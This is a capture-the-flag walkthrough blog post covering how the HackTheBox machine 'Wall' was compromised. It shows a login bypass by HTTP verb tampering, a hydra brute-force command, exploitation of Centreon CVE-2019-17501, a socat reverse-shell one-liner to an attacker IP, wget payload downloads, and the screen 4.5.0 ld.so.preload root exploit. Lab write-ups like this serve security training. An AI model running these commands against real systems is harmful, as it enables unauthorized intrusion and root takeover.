<style>:root{--bg-color:#121212;--text-color:#ffffff;--accent-red:#ff4d4d;--accent-purple:#bb86fc;--secondary-color:#03dac6;--card-bg:#1e1e1e;--code-bg:#2d2d2d;--border-color:#333}body{background-color:var(--bg-color);color:var(--text-color);font-family:"Segoe UI",Roboto,Oxygen,Ubuntu,Cantarell,"Open Sans","Helvetica Neue",sans-serif;line-height:1.6;margin:0;padding:20px;max-width:1200px;margin:0 auto}.post-content{background-color:var(--card-bg);border-radius:8px;padding:30px;box-shadow:0 4px 6px rgba(0,0,0,0.3);margin-bottom:30px;color:var(--text-color) !important}h1,h2,h3,h4{color:var(--accent-purple);margin-top:1.5em}h3 span{color:var(--accent-red) !important}a{color:var(--secondary-color);text-decoration:none}a:hover{text-decoration:underline}pre,code{background-color:var(--code-bg);border-radius:4px;padding:2px 4px;font-family:Consolas,Monaco,"Andale Mono",monospace;color:#f8f8f2}pre{overflow-x:auto;padding:15px;border-left:3px solid var(--accent-purple)}img{max-width:100%;height:auto;display:block;margin:20px auto;border:1px solid var(--border-color)}ul,ol{padding-left:20px}li{margin-bottom:8px}.post-date,.post-cats{color:#aaa;font-size:0.9em;margin-bottom:20px}span,p{color:inherit !important}span[style*="color: #800000"]{color:var(--accent-red) !important}</style>
<div class="post-content">
            <div class="post-cats">
                <span class="cat-links"><a href="https://www.hackingarticles.in/category/ctf-challenges/" rel="category tag">CTF Challenges</a>, <a href="https://www.hackingarticles.in/category/ctf-challenges/hackthebox/" rel="category tag">HackTheBox</a></span>            </div>
            <h1 class="post-title entry-title">HacktheBox Wall Walkthrough</h1>            <div class="post-date">
                                    <div class="entry-meta">
                        <span class="posted-on"><a href="https://www.hackingarticles.in/hack-the-box-wall-walkthrough/" rel="bookmark"><time class="entry-date published" datetime="2020-03-26T07:02:03+00:00">March 26, 2020</time><time class="updated" datetime="2025-06-27T11:56:58+00:00">June 27, 2025</time></a></span><span class="post_by"> by <span class="author vcard"><a class="url fn n" href="https://www.hackingarticles.in/author/raj/">Raj</a></span></span>                    </div><!-- .entry-meta -->
                            </div>

            <div class="content post-excerpt entry-content clearfix">
                <p><span style="color: #000000;">Today we are going to crack a machine called Wall. It was created by aksar. This is a Capture the Flag type of challenge. This machine is hosted on HackTheBox. Let’s get cracking!!</span></p>
<h3><span style="color: #800000;">Penetration Testing Methodology</span></h3>
<ul>
<li><span style="color: #000000;"><strong>Network Scanning</strong></span>
<ul>
<li><span style="color: #000000;">Nmap</span></li>
</ul>
</li>
<li><span style="color: #000000;"><strong>Enumeration</strong></span>
<ul>
<li><span style="color: #000000;">Browsing HTTP Service at port 80</span></li>
<li><span style="color: #000000;">Directory Bruteforce using DirBuster</span></li>
<li><span style="color: #000000;">Bypass Authentication using Verb Tampering</span></li>
<li><span style="color: #000000;">Bruteforcing using hydra</span></li>
</ul>
</li>
<li><span style="color: #000000;"><strong>Exploitation</strong></span>
<ul>
<li><span style="color: #000000;">Detect Remote Command Execution</span></li>
<li><span style="color: #000000;">Invoke Reverse Shell using RCE</span></li>
</ul>
</li>
<li><span style="color: #000000;"><strong>Privilege Escalation</strong></span>
<ul>
<li><span style="color: #000000;">Downloading Screen 4.5.0 Exploit</span></li>
<li><span style="color: #000000;">Crafting the Payload</span></li>
<li><span style="color: #000000;">Compiling the Payload</span></li>
<li><span style="color: #000000;">Transferring the Payload</span></li>
<li><span style="color: #000000;">Getting Root Shell</span></li>
</ul>
</li>
<li><span style="color: #000000;"><strong>Reading Root Flag</strong></span></li>
</ul>
<h3><span style="color: #000000;"><strong>Walkthrough</strong></span></h3>
<h3><span style="color: #800000;">Network Scanning</span></h3>
<p><span style="color: #000000;">To Attack any machine, we need the IP Address. Machines hosted on HackTheBox have a static IP Address.</span></p>
<p><strong><span style="color: #000000;">IP Address: 10.10.10.157</span></strong></p>
<p><span style="color: #000000;">Now that we have the IP Address, We need to enumerate open ports on the machine. For this, we will be running a nmap scan. To get the most information and fast, we ran the Aggressive Scan.</span></p>
<pre class="EnlighterJSRAW" data-enlighter-language="generic">nmap -A 10.10.10.157</pre>
<p><img decoding="async" src="https://1.bp.blogspot.com/-vtTKeZf9pQk/XnxPbMspR6I/AAAAAAAAjOI/6K6pLTZ3Af8S0HEoxzN90Gt8_k2AChXxACLcBGAsYHQ/s1600/1.png"/></p>
<p><span style="color: #000000;">The Nmap Aggressive scan quickly gave us some great information. It positively informed that the following ports and services are running 22 (SSH), 80(HTTP). Let’s move on to Enumeration Stage.</span></p>
<h3><span style="color: #800000;">Enumeration</span></h3>
<p><span style="color: #000000;">Let’s start with the Port 80. We ran the browser and opened the IP Address of the Machine. It gave us a default Debian Apache is Working Page.</span></p>
<pre class="EnlighterJSRAW" data-enlighter-language="generic">http://10.10.10.157</pre>
<p><img decoding="async" src="https://1.bp.blogspot.com/-DdAQPeGgMIA/XnxPfHvr7mI/AAAAAAAAjOo/-bAM4MmqQdAX6P8gCKd0PoYcrmvHG1ikQCLcBGAsYHQ/s1600/2.png"/></p>
<p><span style="color: #000000;">Its time to do some directory bruteforce on our target. Generally, we use the dirb tool but let’s show some love to DirBuster sometimes as well. Usage is pretty straight-forward. Enter the Target URL, locate the dictionary you want to use for the bruteforce. Here, in this case, we will be using the medium.txt. It can be found in Kali Linux by default. After everything is set, just click Start and kickback.</span></p>
<p><img decoding="async" src="https://1.bp.blogspot.com/-oMa5HXkRQ3U/XnxPf3KOYXI/AAAAAAAAjO0/Rqrmnkw_7MUQfXUYj-BLkig4hj8FWUvwQCLcBGAsYHQ/s1600/3.png"/></p>
<p><span style="color: #000000;">After working for a while, it gave us one directory called monitoring, Felt to take a look at it.</span></p>
<p><img decoding="async" src="https://1.bp.blogspot.com/-zesoloNt6tU/XnxPgtzhLXI/AAAAAAAAjO4/ZVT-ghDBaP4Cj4eqFU58nRul-BhoQuoMQCLcBGAsYHQ/s1600/4.png"/></p>
<p><span style="color: #000000;">So, we entered the URL in the Browser and we have ourselves a Login Panel. This is no fun. It does say that “Protected area by the admin”. So we get that username is admin. Easy Part is done. Now, all we got to do is get through this panel.</span></p>
<p><img decoding="async" src="https://1.bp.blogspot.com/-Ki-KnLkpKZk/XnxPg189_8I/AAAAAAAAjO8/aNuQgfbv77kqsmnqtYW7yiIt3pv1MB_3ACLcBGAsYHQ/s1600/6.png"/></p>
<h4><span style="color: #000000;">Bypassing Login</span></h4>
<p><span style="color: #000000;">After trying a bunch of bruteforce techniques, we were not able to get through his login panel. That’s when it hit us, we should try HTTP Verb Tampering. So, we fired up our BurpSuite and captured the request of the /monitoring/ page.</span></p>
<p><img decoding="async" src="https://1.bp.blogspot.com/-xr3pci70UZ4/XnxPhGPC-cI/AAAAAAAAjPA/tOud7oWLqWAlCaqk4PMB256-NXENFcsPACLcBGAsYHQ/s1600/7.png"/></p>
<p><span style="color: #000000;">As we observed that there is a GET request being sent to the server. We decided to tamper with it and we changed it to POST. After making this change, we forwarded the request to the server.</span></p>
<p><img decoding="async" src="https://1.bp.blogspot.com/-jqZ8lrjti2I/XnxPhc0YoJI/AAAAAAAAjPE/MEilFEEG7nAE0vgDTq3OwaM5T4WU5n7eACLcBGAsYHQ/s1600/8.png"/></p>
<p><span style="color: #000000;">Verb Tampering worked and we were redirected to the /centreon/ page. Here we have another Login Form. How lucky! Now we need to bypass this as well.</span></p>
<p><img decoding="async" src="https://1.bp.blogspot.com/-dQu95TEGLHg/XnxPhhQ4U1I/AAAAAAAAjPI/BBEPKsNchMYhYq6Uy_epQLqKkeURD1PvQCLcBGAsYHQ/s1600/9.png"/></p>
<p><span style="color: #000000;">We attempted to bruteforce it using Burpsuite but we were unsuccessful. Then, we closely examined the source code of the page and discovered a Centreon token that prevented us from brute-forcing. Next, we ran a directory bruteforce on this page. It revealed the /api/ page. So, we decided to bruteforce the API for the credentials. We searched for the API documentation for Centreon (https://documentation.centreon.com/docs/centreon/en/latest/api/api_rest/index.html) to find the query that we could brute-force. In the API documentation, it instructs us to send a POST request to the API. When we did so, we got the message “Bad Credentials”. So we gained enough information for crafting a bruteforce query. We crafted this query to bruteforce with the Hydra Tool.</span></p>
<pre class="EnlighterJSRAW" data-enlighter-language="generic">hydra -l admin -P /usr/share/wordlists/rockyou.txt 10.10.10.157 http-post-form "/centreon/api/index.php?action=authenticate:username=^USER^&amp;password=^PASS^:Bad Credentials" -V</pre>
<p><span style="color: #000000;">Here, we started by giving the username “admin”. We got this from the initial login panel. Then we provided the wordlist for bruteforce. Next, we gave the target IP address. Then we provided the type of authentication panel, which is “http-post-form”. Followed by the URL and usernames and password parameters and the response text that could be used to differentiate the valid and invalid credentials. This gave us the credentials: </span></p>
<p><strong><span style="color: #000000;">Username: admin </span></strong></p>
<p><strong><span style="color: #000000;">Password: password1</span></strong></p>
<p><img decoding="async" src="https://1.bp.blogspot.com/-4XV4SWrlCGw/XnxPbfbe8_I/AAAAAAAAjOQ/IFpd5QpzH4ADUIJUEV6eDaUwaFiFT63ewCLcBGAsYHQ/s1600/10.png"/></p>
<h4><span style="color: #000000;">Exploiting RCE</span></h4>
<p><span style="color: #000000;">Now, this panel which we got was not something that we are used to working every day. But being in the penetration testing business we are sure to check out the CVEs for any panel, software or CMS. We did our research and found CVE-2019-17501 https://www.cvedetails.com/cve/CVE-2019-17501/. There was a GitHub link mentioned in the description of this CVE. We browsed it to find ourselves a PoC. On a closer look, the PoC contained a path.</span></p>
<pre class="EnlighterJSRAW" data-enlighter-language="generic">http://ip-address/centreon/main.php?p=60807&amp;type=4</pre>
<p><span style="color: #000000;">We entered that URL in our Browser. Here we found an Add a Command Form. This contained the Command Input Field. We entered “cat /etc/passwd” here to check if RCE is working. After entering the command we hit that Blue Play button (Highlighted in the Image). This resulted in the opening of a new window with the result of the command we entered. RCE is indeed working. Now let’s get a shell form here.</span></p>
<p><img decoding="async" src="https://1.bp.blogspot.com/-DZLMEPWluk0/XnxPbUWQk3I/AAAAAAAAjOM/9djzpJrTlboZ1cPkAPlNAvm2T4nJSPm_QCLcBGAsYHQ/s1600/13.png"/></p>
<p><span style="color: #000000;">We decided to use a socat reverse shell. We edited our attacker IP Address into the one-liner and then entered it into the field. Then we clicked the Blue Play button that we used previously for the command to get executed. Before this, we start a netcat listener on the port that we mentioned in this one-liner.</span></p>
<pre class="EnlighterJSRAW" data-enlighter-language="generic">socat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:10.10.14.10:1234</pre>
<p><img decoding="async" src="https://1.bp.blogspot.com/-zTFoFLY1HC0/XnxPcFIk3RI/AAAAAAAAjOU/YiaATs3x_KAFa2Tkjc8WulO-jHJIE2SCgCLcBGAsYHQ/s1600/14.png"/></p>
<p><span style="color: #000000;">As soon as the command gets executed, we have a shell in the lister we started. Now as a part of our Post Exploitation tasks, we decided to use the find command to look for the SUID files. We found the screen-4.5.0. file as shown in the image given below.</span></p>
<pre class="EnlighterJSRAW" data-enlighter-language="generic">nc -lvp
find / -perm -u=s -type f 2&gt;/dev/null</pre>
<p><img decoding="async" src="https://1.bp.blogspot.com/-2pTVYMaaEvQ/XnxPcrdYqLI/AAAAAAAAjOY/8oOrrQtTEyYxMzy0g97w3hJJocXzWga5gCLcBGAsYHQ/s1600/15.png"/></p>
<h4><span style="color: #000000;">Privilege Escalation</span></h4>
<p><span style="color: #000000;">Now we used the searchsploit command to look for the exploit for the screen-4.5.0. We see that we have the exploit by the name 41154.sh. We download this exploit to our attacker machine via searchsploit.</span></p>
<pre class="EnlighterJSRAW" data-enlighter-language="generic">searchsploit screen 4.5.0
searchsploit -m 41154
cat 41145.sh</pre>
<p><strong><img decoding="async" src="https://1.bp.blogspot.com/-6Yde2Uc67a4/XnxPeKKHjSI/AAAAAAAAjOg/ZGvoQkeMcdsrF_pZsNhs3FTjW5yR4d8kQCLcBGAsYHQ/s1600/16.png"/></strong></p>
<p><span style="color: #000000;">Now, we read the script. It divides itself into 3 files.</span></p>
<p><span style="color: #000000;">File#1: libhax.c</span></p>
<p><span style="color: #000000;">File#2: rootshell.c</span></p>
<p><span style="color: #000000;">File#3: 41154.sh</span></p>
<p><span style="color: #000000;">Each of them consisting the following code. You can download these files from our GitHub.</span></p>
<p><img decoding="async" src="https://1.bp.blogspot.com/-kwOa_QU9BaA/XnxPd25crLI/AAAAAAAAjOc/T-01TxDP0LwmK8OzQ2djiW73Qw6pDSzZACLcBGAsYHQ/s1600/18.png"/></p>
<p><span style="color: #000000;">Now we need to compile the c files to get the object code. We will be using the gcc to compile this file.</span></p>
<pre class="EnlighterJSRAW" data-enlighter-language="generic">gcc -fPIC -shared -ldl -o libhax.so libhax.c
gcc -o rootshell rootshell.c
python -m SimpleHTTPServer</pre>
<p><span style="color: #000000;">After compiling the code we ran a python one-liner to transfer the payload files.</span></p>
<p><img decoding="async" src="https://1.bp.blogspot.com/-DvEwH_iNncw/XnxPeU8EFrI/AAAAAAAAjOk/pEzyq5J3uRkfh88UYVEdjPLZtnuoEHFngCLcBGAsYHQ/s1600/19.png"/></p>
<p><span style="color: #000000;">We went back to the session that we have of the target system and downloaded the payload files onto the machine using wget command.</span></p>
<pre class="EnlighterJSRAW" data-enlighter-language="generic">wget http://10.10.14.10:8000/41154.sh
wget http://10.10.14.10:8000/libhax.so
wget http://10.10.14.10:8000/rootshell</pre>
<p><img decoding="async" src="https://1.bp.blogspot.com/-fLNELy8ckWw/XnxPfrWouzI/AAAAAAAAjOs/_gaxP_1JukMZ9VG-pjLVAYHzOqqt0KUkwCLcBGAsYHQ/s1600/20.png"/></p>
<p><span style="color: #000000;">Then, if we read the initial sh files, we know that we need to perform some configurations before actually running the payload.</span></p>
<pre class="EnlighterJSRAW" data-enlighter-language="generic">cd /etc
umask 000
screen-4.5.0 -D -m -L ld.so.preload echo -ne  "\x0a/tmp/libhax.so"
/bin/screen-4.5.0 -ls</pre>
<p><span style="color: #000000;">After these configurations, we ran payload. This gave us a root shell. This can be confirmed using the whoami command. We traverse into the /root directory. Here we found the root flag.</span></p>
<pre class="EnlighterJSRAW" data-enlighter-language="generic">/tmp/rootshell
whoami
cd /root
ls
cat root.txt</pre>
<p><img decoding="async" src="https://1.bp.blogspot.com/--pZiGA_J5mQ/XnxPfrSn5mI/AAAAAAAAjOw/NT6mAjD1RqY2duY5FVhLQvshpfaLpmx5wCLcBGAsYHQ/s1600/21.png"/></p>
<p><span style="color: #000000;">This concludes this machine. This was a pretty lab. We got to use the Screen 4.5.0 privilege escalation technique after quite some time.</span></p>
<p><span style="color: #000000;">Thank you for giving your precious time to read this walkthrough. If you want to read more HTB Write-ups. Follow this</span> <strong><a href="https://www.hackingarticles.in/category/ctf-challenges/hackthebox/">Link.</a></strong> <span style="color: #000000;">Happy Hacking!</span></p>
<p><strong>Author: Pavandeep Singh</strong> is a Technical Writer, Researcher and Penetration Tester. Contact on <strong>Twitter</strong> and <strong><a href="https://www.linkedin.com/in/pavan2318/">LinkedIn</a></strong></p>
<div class="yarpp yarpp-related yarpp-related-website yarpp-template-thumbnails">
